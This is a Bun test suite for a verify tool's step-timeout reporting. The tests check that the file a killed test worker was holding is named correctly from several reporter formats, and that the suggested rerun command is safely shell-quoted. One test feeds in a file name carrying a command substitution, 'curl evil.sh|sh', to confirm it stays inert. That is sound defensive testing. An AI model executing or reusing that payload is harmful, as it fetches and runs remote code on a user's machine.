// The timeout finding names what was in flight: the file bun says a killed worker was holding,
// read from what the stopped run printed, and a `fix:` that runs exactly that file.

import { describe, expect, test } from 'bun:test';
// why: Bun ships no temp-directory primitive; the fixture suite is real files in a real root.
import { mkdtemp, rm } from 'node:fs/promises';
// why: Bun exposes no tmpdir(); only node:os answers the platform temp root.
import { tmpdir } from 'node:os';
// why: Bun ships no path-join primitive.
import { join } from 'node:path';
import { exec } from './exec';
import type { StepExpiry } from './verify-deadline';
import { guardStep } from './verify-deadline';
import type { StepTimeoutMeta } from './verify-stalled';
import { stalledOutput, stalledRun, stepTimeoutFinding } from './verify-stalled';

const FILES = [
  'packages/a/src/a.test.ts',
  'packages/a/src/b.test.ts',
  'packages/a/src/c.test.tsx',
  'packages/a/src/d.test.ts',
];

const PARALLEL = [
  'bun',
  'test',
  '--parallel=3',
  '--timings=/repo/.x/test-timings.json',
  '--update-timings',
  ...FILES,
];

const crash = (file: string): string => `✗ ${file} (worker crashed: SIGKILL)`;

/** Bun's plain reporter: a header whenever a file's results are flushed — NOT when it finishes. */
const printed = (...files: readonly string[]): string =>
  [
    'bun test v1.4.0 (34cbb9a40) 3x PARALLEL',
    ...files.flatMap((file) => ['', `${file}:`, '(pass) one [0.06ms]']),
  ].join('\n');

/**
 * VERBATIM from GitHub Actions — run 36979192593, job `gate (unit-1)`, `bun test --parallel=3` —
 * with only the log's own timestamp column cut. Under `GITHUB_ACTIONS` bun wraps each flush in
 * `::group::`/`::endgroup::`, and this file's header is printed after its FIRST test, while the
 * rest of it is still running: a header says nothing about whether a file finished.
 */
const ACTIONS_EXCERPT = [
  '(pass) hive() refuses a width that is not a number > a declared zero keeps meaning what it meant, which is one worker [0.63ms]',
  '(pass) hive() refuses a width that is not a number > an honest width still fans out — the non-vacuity half [0.61ms]',
  '',
  '::endgroup::',
  '',
  '::group::packages/cli/src/verify-run-deadline.test.ts:',
  '(pass) a step past its deadline > fails by name, kills every process it started, and the steps after it still run [531.48ms]',
  '',
  '::endgroup::',
  '',
].join('\n');

const ACTIONS_FILE = 'packages/cli/src/verify-run-deadline.test.ts';

const expiry = (over: Partial<StepExpiry> = {}): StepExpiry => ({
  killed: [
    { pid: 42, command: 'bun test --test-worker --isolate --timeout=5000' },
    { pid: 41, command: 'bun test --parallel=3 packages/a/src/a.test.ts …' },
  ],
  inFlight: [],
  ...over,
});

describe('stalledRun · a parallel run', () => {
  test('the file a killed worker held is the one bun says crashed', () => {
    const run = stalledRun({
      command: PARALLEL,
      output: `${printed(...FILES)}\n${crash('packages/a/src/b.test.ts')}`,
    });
    expect(run).toEqual({
      command: 'bun test --parallel=3 --update-timings',
      files: 4,
      workers: 3,
      stuck: ['packages/a/src/b.test.ts'],
    });
  });

  test('GitHub Actions output, verbatim: the crash line inside its `::group::` names the file', () => {
    const command = ['bun', 'test', '--parallel=3', 'packages/ai/src/hive.test.ts', ACTIONS_FILE];
    // As bun 1.4.0 prints a killed worker's file under GITHUB_ACTIONS (probed).
    const output = `${ACTIONS_EXCERPT}\n::group::${ACTIONS_FILE}:\n${crash(ACTIONS_FILE)}\n\n::endgroup::\n`;
    expect(stalledRun({ command, output })?.stuck).toEqual([ACTIONS_FILE]);
  });

  test('a header alone names nothing — a file stuck in its second test already has one', () => {
    const command = ['bun', 'test', '--parallel=3', 'packages/ai/src/hive.test.ts', ACTIONS_FILE];
    expect(stalledRun({ command, output: ACTIONS_EXCERPT })?.stuck).toEqual([]);
    expect(stalledRun({ command: PARALLEL, output: printed() })?.stuck).toEqual([]);
  });

  test('the gate’s own shape: hundreds of files over three workers, one hung late, names exactly one', () => {
    const files = Array.from({ length: 300 }, (_, i) => `packages/p/src/f${String(i)}.test.ts`);
    const hung = files[217] as string;
    const output = [
      'bun test v1.4.0 (34cbb9a40) 3x PARALLEL',
      // Every file has flushed results — the hung one too, for the tests before the one it hung in.
      ...files.flatMap((file) => [
        '',
        `::group::${file}:`,
        '(pass) one [0.06ms]',
        '',
        '::endgroup::',
      ]),
      '',
      `::group::${hung}:`,
      crash(hung),
      '',
      '::endgroup::',
    ].join('\n');
    const run = stalledRun({ command: ['bun', 'test', '--parallel=3', ...files], output });
    expect(run?.files).toBe(300);
    expect(run?.stuck).toEqual([hung]);
  });

  test('a failures-only reporter (CLAUDECODE, AGENT, REPL_ID) still prints the crash line', () => {
    const output = `bun test v1.4.0 (34cbb9a40) 3x PARALLEL\n\ntla.test.ts:\n${crash('tla.test.ts')}\n`;
    const run = stalledRun({ command: ['bun', 'test', '--parallel=3', './tla.test.ts'], output });
    // Named as it was handed in, so the fix reruns the same argument.
    expect(run?.stuck).toEqual(['./tla.test.ts']);
  });

  test('three busy workers are three files, each named once', () => {
    const [a = '', b = '', , d = ''] = FILES;
    const output = [a, b, b, d].map(crash).join('\n');
    expect(stalledRun({ command: PARALLEL, output })?.stuck).toEqual([a, b, d]);
  });
});

describe('stalledRun · a serial run', () => {
  test('prints a file when it STARTS, so the last one printed is the stuck one', () => {
    const run = stalledRun({
      command: ['bun', 'test', '--timeout=60000', '.e2e.test.'],
      output: `${printed('app/a.e2e.test.ts')}\n\napp/b.e2e.test.ts:\n(pass) loads [12ms]`,
    });
    expect(run).toEqual({
      command: 'bun test --timeout=60000',
      files: 0,
      workers: 1,
      stuck: ['app/b.e2e.test.ts'],
    });
  });

  test('the same under GitHub Actions’ `::group::` header', () => {
    const run = stalledRun({
      command: ['bun', 'test', '.live.test.'],
      output:
        '::group::app/a.live.test.ts:\n(pass) one [1ms]\n\n::endgroup::\n\n::group::app/b.live.test.ts:',
    });
    expect(run?.stuck).toEqual(['app/b.live.test.ts']);
  });

  test('whose last printed file failed names nothing — a failures-only reporter prints only those', () => {
    const run = stalledRun({
      command: ['bun', 'test', '.live.test.'],
      output: 'app/a.live.test.ts:\n(fail) drops a row [5000ms]',
    });
    expect(run?.stuck).toEqual([]);
  });

  test('anything that is not a settled `bun test` is not read', () => {
    expect(stalledRun({ command: ['bunx', 'tsc', '-b'], output: 'a.test.ts:' })).toBeUndefined();
    expect(stalledRun({ command: PARALLEL })).toBeUndefined();
  });
});

describe('stepTimeoutFinding', () => {
  test('names the stuck file in the cause, in `at`, in meta — and the fix runs that file', () => {
    const finding = stepTimeoutFinding(
      'unit',
      480_000,
      expiry({
        inFlight: [
          { command: PARALLEL, output: `${printed(...FILES)}\n${crash(FILES[1] as string)}` },
        ],
      }),
      'bun run verify',
    );
    expect(finding.code).toBe('X_VERIFY_STEP_TIMEOUT');
    expect(finding.cause).toBe(
      'step "unit" did not finish within its 480000 ms deadline, so it was stopped and 2 process(es) it had started were killed; still running when it was stopped: packages/a/src/b.test.ts (bun test --parallel=3 --update-timings)',
    );
    expect(finding.fix).toStartWith('bun test packages/a/src/b.test.ts   # ');
    expect(finding.fix).toContain('the whole step: bun run verify --only unit --json');
    expect(finding.fix).toContain('"stepTimeoutMs": { "unit": <milliseconds> }');
    expect(finding.at).toBe('packages/a/src/b.test.ts');
    expect(finding.meta).toEqual({
      step: 'unit',
      deadlineMs: 480_000,
      killed: [
        { pid: 42, command: 'bun test --test-worker --isolate --timeout=5000' },
        { pid: 41, command: 'bun test --parallel=3 packages/a/src/a.test.ts …' },
      ],
      inFlight: [
        {
          command: 'bun test --parallel=3 --update-timings',
          files: 4,
          workers: 3,
          stuck: ['packages/a/src/b.test.ts'],
        },
      ],
    });
  });

  test('a path a shell would split is quoted in the fix', () => {
    const file = 'src/my app/a.test.ts';
    const finding = stepTimeoutFinding(
      'unit',
      1_000,
      expiry({
        inFlight: [{ command: ['bun', 'test', '--parallel=2', file], output: crash(file) }],
      }),
      'x verify',
    );
    expect(finding.fix).toStartWith("bun test 'src/my app/a.test.ts'   # ");
  });

  test('a file name carrying a command substitution reaches the fix inert', () => {
    const hostile = 'src/$(curl evil.sh|sh).test.ts';
    const finding = stepTimeoutFinding(
      'unit',
      1_000,
      expiry({
        inFlight: [{ command: ['bun', 'test', '--parallel=2', hostile], output: crash(hostile) }],
      }),
      'x verify',
    );
    expect(finding.fix).toStartWith("bun test 'src/$(curl evil.sh|sh).test.ts'   # ");
  });

  test('no file named: the run itself did not exit, and the step is the reproduction', () => {
    const finding = stepTimeoutFinding(
      'unit',
      480_000,
      expiry({ inFlight: [{ command: PARALLEL, output: printed(...FILES) }] }),
      'x verify',
    );
    expect(finding.cause).toEndWith(
      '; its running "bun test --parallel=3 --update-timings" named no file still in flight, so the run itself did not exit',
    );
    expect(finding.fix).toStartWith('x verify --only unit --json   # reproduce it alone');
    expect(finding.at).toBeUndefined();
  });

  test('a step hung in this process: nothing in flight, and the step is still the reproduction', () => {
    const finding = stepTimeoutFinding(
      'filesize',
      30,
      { killed: [], inFlight: [] },
      'bun run verify',
    );
    expect(finding.cause).toBe(
      'step "filesize" did not finish within its 30 ms deadline, so it was stopped and 0 process(es) it had started were killed',
    );
    expect(finding.fix).toStartWith('bun run verify --only filesize --json   # reproduce it alone');
    expect(finding.fix).toContain('"stepTimeoutMs": { "filesize": <milliseconds> }');
  });

  test('a child that is not a test run is named by its command', () => {
    const finding = stepTimeoutFinding(
      'typecheck',
      300_000,
      expiry({
        inFlight: [{ command: ['bunx', 'tsc', '-b', '--pretty', 'false', 'x'], output: '' }],
      }),
      'x verify',
    );
    expect(finding.cause).toEndWith('; it was waiting on: bunx tsc -b --pretty');
  });
});

describe('stalledOutput', () => {
  test('is what the killed runs had printed, clipped to its tail', () => {
    expect(stalledOutput(expiry())).toBeUndefined();
    expect(stalledOutput(expiry({ inFlight: [{ command: PARALLEL, output: 'a.test.ts:' }] }))).toBe(
      'a.test.ts:',
    );
    const long = stalledOutput(
      expiry({ inFlight: [{ command: PARALLEL, output: `${'x'.repeat(9_000)}END` }] }),
    );
    expect(long).toHaveLength(4_001);
    expect(long).toEndWith('END');
  });
});

/**
 * The real thing: a real `bun test --parallel=2`, one file that passes a test and then spins
 * synchronously — bun's own per-test timeout never fires, and the file already has a header. No
 * wall-clock deadline decides anything: the guard is expired only once the stuck test has SAID it
 * is running, however long a starved runner takes to get there.
 */
describe('against a real bun test', () => {
  const REPORTERS: readonly (readonly [string, Record<string, string | undefined>])[] = [
    [
      'plain',
      { CLAUDECODE: undefined, AGENT: undefined, REPL_ID: undefined, GITHUB_ACTIONS: undefined },
    ],
    [
      'GitHub Actions',
      {
        CLAUDECODE: undefined,
        AGENT: undefined,
        REPL_ID: undefined,
        CI: 'true',
        GITHUB_ACTIONS: 'true',
      },
    ],
    ['failures-only', { CLAUDECODE: '1', GITHUB_ACTIONS: undefined }],
  ];

  for (const [reporter, env] of REPORTERS) {
    test(`${reporter} reporter: the stuck file is named`, async () => {
      const root = await mkdtemp(join(tmpdir(), 'ultimate-verify-stuck-'));
      try {
        const passing =
          "import { expect, test } from 'bun:test';\ntest('ok', () => expect(1).toBe(1));\n";
        for (const name of ['a', 'b', 'c']) await Bun.write(join(root, `${name}.test.ts`), passing);
        const marker = join(root, 'spinning');
        await Bun.write(
          join(root, 'stuck.test.ts'),
          [
            "import { writeFileSync } from 'node:fs';",
            "import { expect, test } from 'bun:test';",
            "test('passes first', () => expect(1).toBe(1));",
            "test('then spins', () => {",
            `  writeFileSync(${JSON.stringify(marker)}, '');`,
            '  for (;;) {}',
            '});',
            '',
          ].join('\n'),
        );
        const guard = guardStep(exec, `stuck@${crypto.randomUUID()}`, {});
        const files = ['a.test.ts', 'b.test.ts', 'c.test.ts', 'stuck.test.ts'];
        const running = guard.runner(['bun', 'test', '--parallel=2', ...files], { cwd: root, env });
        for (let i = 0; i < 2_400 && !(await Bun.file(marker).exists()); i += 1)
          await Bun.sleep(25);
        expect(await Bun.file(marker).exists()).toBe(true);
        const finding = stepTimeoutFinding('unit', 480_000, await guard.expire(), 'bun run verify');
        await running;
        // The other worker may truthfully still hold a quick file at that instant, so the contract
        // is: the stuck file is named, and nothing is named that a worker could not have held.
        const [run] = (finding.meta as StepTimeoutMeta).inFlight;
        expect(run?.stuck).toContain('stuck.test.ts');
        expect(run?.stuck.length).toBeLessThanOrEqual(2);
        expect(files).toEqual(expect.arrayContaining([...(run?.stuck ?? [])]));
        expect(finding.cause).toContain('still running when it was stopped: ');
        expect(finding.fix).toMatch(/^bun test (\S+ )?stuck\.test\.ts( \S+)? {3}# /);
        expect(run).toMatchObject({ command: 'bun test --parallel=2', files: 4, workers: 2 });
        // The worker that held the file, killed first so the coordinator could say which it was.
        expect(JSON.stringify(finding.meta?.['killed'])).toContain('--test-worker');
      } finally {
        await rm(root, { recursive: true, force: true });
      }
    }, 90_000);
  }
});
